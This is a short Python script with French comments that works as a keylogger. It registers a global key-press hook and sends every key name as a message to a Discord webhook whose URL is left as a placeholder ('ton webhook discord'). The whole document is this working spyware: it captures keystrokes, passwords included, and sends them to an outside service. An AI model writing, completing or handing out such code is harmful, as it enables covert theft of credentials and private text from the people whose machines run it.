import keyboard
import requests
import json

webhook_url = "ton webhook discord"

def on_key_press(e):
    data = {"content": f"{e.name}"}
    headers = {"Content-Type": "application/json"}
    
    requests.post(webhook_url, data=json.dumps(data), headers=headers)
    
    

# Enregistrez la fonction de gestion des événements de pression de touche
keyboard.on_press(on_key_press)

# Maintenez le programme en cours d'exécution
keyboard.wait()



